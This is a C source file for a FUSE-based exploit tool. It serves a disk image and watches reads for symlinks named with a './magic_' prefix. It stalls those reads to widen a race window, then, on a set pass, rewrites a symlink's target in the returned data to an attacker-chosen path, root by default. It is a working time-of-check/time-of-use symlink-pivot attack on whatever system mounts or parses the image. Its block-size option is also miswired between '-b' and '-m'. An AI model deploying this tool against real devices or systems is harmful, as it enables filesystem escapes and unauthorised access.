/*
 * Originally taken from https://github.com/fntlnz/fuse-example.
 */

#define FUSE_USE_VERSION 26

#include <unistd.h>
#include <fuse.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <getopt.h>
#include <stdbool.h>

#define DEFAULT_SYMLINK_PATTERN "./magic_"

static const char *filepath = "/path_pivot.img";
static const char *filename = "path_pivot.img";

// Hits.
static unsigned symlink_hits[40];
static int nr_reads = 0;

// Output log.
static int logfd = STDERR_FILENO;

// File descriptor of disk image.
static int diskfd;

// Options.
static unsigned int timeout_secs = 0; 
static size_t max_block_size = SIZE_MAX;
static const char *symlink_pattern = DEFAULT_SYMLINK_PATTERN;
static size_t pattern_size = sizeof(DEFAULT_SYMLINK_PATTERN) - 1;
static const char *target = "/";
static unsigned int nr_pass = 2;

static int getattr_callback(const char *path, struct stat *stbuf)
{
    memset(stbuf, 0, sizeof(struct stat));

    if (strcmp(path, "/") == 0) {
        stbuf->st_mode = S_IFDIR | 0755;
        stbuf->st_nlink = 2;
        return 0;
    }

    if (strcmp(path, filepath) == 0) {
        struct stat st;

        if ( fstat(diskfd, &st) == -1 )
            return -errno;

        stbuf->st_mode = S_IFREG | 0777;
        stbuf->st_nlink = 1;
        stbuf->st_size = st.st_size;
        return 0;
    }

    return -ENOENT;
}

static int readdir_callback(const char *path, void *buf, fuse_fill_dir_t filler,
                            off_t __attribute__((unused)) offset,
                            struct fuse_file_info *__attribute__((unused)) fi)
{
    filler(buf, ".", NULL, 0);
    filler(buf, "..", NULL, 0);
    filler(buf, filename, NULL, 0);

    return 0;
}

static int open_callback(const char *path, struct fuse_file_info *fi)
{
    nr_reads = 0;

    return 0;
}

static int is_symlink(char *buf, size_t size)
{
    if ( size < pattern_size )
        return 0;

    for ( size_t i = 0; i < size - pattern_size; i++ )
    {
        if ( memcmp(symlink_pattern, buf + i, pattern_size) == 0 ) {
                unsigned symlink_idx = strtoul(buf + i + pattern_size, NULL, 10);
                if ( symlink_idx == 0 || symlink_idx > 40 )
                    break;
                    
                symlink_hits[symlink_idx-1]++;

                dprintf(logfd, "[*] Detected pattern %s (hit: %d)\n", buf + i, symlink_hits[symlink_idx-1]);

                if ( symlink_idx == 40 && symlink_hits[symlink_idx-1] == nr_pass ) {
                    dprintf(logfd, "[*] Pivoting symlink to %s\n", target);
                    strcpy(buf + i, target);
                }

                return 1;
        }
    }

    return 0;
}

static void delay(unsigned int secs)
{
    dprintf(logfd, "[*] Intercepted magic sector. Waiting for %d seconds...", secs);
    sleep(secs);
}

static int read_callback(const char *path, char *buf, size_t size, off_t offset,
                         struct fuse_file_info *fi)
{
    dprintf(logfd, "[%d] offset = %llx | length = %zx ", nr_reads, offset, size);
    fdatasync(logfd);

    /* split requests to spend more time. */
    if ( size > max_block_size ) {
        size = max_block_size;
    }

    nr_reads++;

    ssize_t ret = -ENOENT;

    if ( strcmp(path, filepath) == 0 ) {
        ret = pread(diskfd, buf, size, offset);

        if ( is_symlink(buf, size) )
            delay(timeout_secs);

        if ( ret == -1 )
            ret = -errno;
    }

    dprintf(logfd, "| ret = %zx\n", ret);

    return ret;
}

static struct fuse_operations fuse_example_operations = {
    .getattr = getattr_callback,
    .open = open_callback,
    .read = read_callback,
    .readdir = readdir_callback,
};

static int create_log_file(const char *path)
{
    return open(path, O_RDWR | O_SYNC | O_TRUNC | O_APPEND | O_CREAT, 0644);
}

static void usage(const char *self)
{
    fprintf(stderr, "Usage: %s [options] <disk_image> <mount_point>\n", self);
    fprintf(stderr, "Options:\n"
                    "  -t, --timeout <secs>         Timeout value in seconds.\n"
                    "  -b, --max-block-size <n>     Maximum read block size.\n"
                    "  -L, --log-file <path>        Path to output log (default to stderr).\n"
                    "  -p, --symlink-pattern <p>    Prefix of symlinks to intercept.\n"
                    "  -d, --pivot-to <target>      Final target redirect to.\n"
                    "  -n, --pass <n>               Pass number to pivot the symlink (default 2).\n");
}

int main(int argc, char *argv[])
{
    while ( true )
    {
        static struct option long_options[] =
        {
            { "timeout", required_argument, 0, 't' },
            { "max-block-size", required_argument, 0, 'm' },
            { "log-file", required_argument, 0, 'L' },
            { "symlink-pattern", required_argument, 0, 'p' },
            { "pivot-to", required_argument, 0, 'd' },
            { "pass", required_argument, 0, 'n' },
            { 0, 0, 0, 0 }
        };

        int opt_index;
        int c = getopt_long(argc, argv, "t:m:L:p:d:n:", long_options, &opt_index);
        if ( c == -1 )
            break;

        switch ( c )
        {
            case 't':
                timeout_secs = strtoul(optarg, NULL, 10);
                if ( timeout_secs > 30 )
                    fprintf(stderr, "Warning: timeout value may disconnect device");
                break;

            case 'b':
                max_block_size = strtoul(optarg, NULL, 16);
                break;

            case 'L':
                logfd = create_log_file(optarg);
                if ( logfd == -1 ) {
                    fprintf(stderr, "Cannot create log file %s: %s\n", optarg, strerror(errno));
                    return 1;
                }
                break;

            case 'p':
                symlink_pattern = optarg;
                pattern_size = strlen(symlink_pattern);
                break;

            case 'd':
                target = optarg;
                break;

            case 'n':
                nr_pass = strtoul(optarg, NULL, 10);
                break;

            default:
                usage(argv[0]);
                return 1;
        }
    }

    if ( argc - optind < 2 ) 
    {
        usage(argv[0]);
        return 1;
    }

    char *disk_image = argv[optind];
    char *mount_point = argv[optind + 1];

    diskfd = open(disk_image, O_RDONLY);
    if ( diskfd == -1 ) {
        fprintf(stderr, "Cannot open disk image %s: %s\n", disk_image, strerror(errno));
        return 1;
    }

    char *fuse_argv[] =
    {
        argv[0],
        mount_point,
        "-o",
        "direct_io",
        NULL
    };

    return fuse_main(4, fuse_argv, &fuse_example_operations, NULL);
}
